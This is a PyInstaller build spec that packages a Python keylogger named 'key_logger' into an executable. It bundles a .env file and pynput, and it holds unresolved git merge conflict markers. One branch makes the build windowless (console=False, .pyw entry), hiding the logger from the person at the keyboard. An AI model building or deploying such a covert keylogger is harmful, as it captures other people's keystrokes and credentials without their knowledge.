# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
<<<<<<< HEAD
    ['key_logger.py'],
=======
    ['key_logger.pyw'],
>>>>>>> 9fe2ee77a053c99aefda04af90accce2fd7d77fb
    pathex=[],
    binaries=[],
    datas=[('.env', '.')],
    hiddenimports=['pynput'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='key_logger',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
<<<<<<< HEAD
    console=True,
=======
    console=False,
>>>>>>> 9fe2ee77a053c99aefda04af90accce2fd7d77fb
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
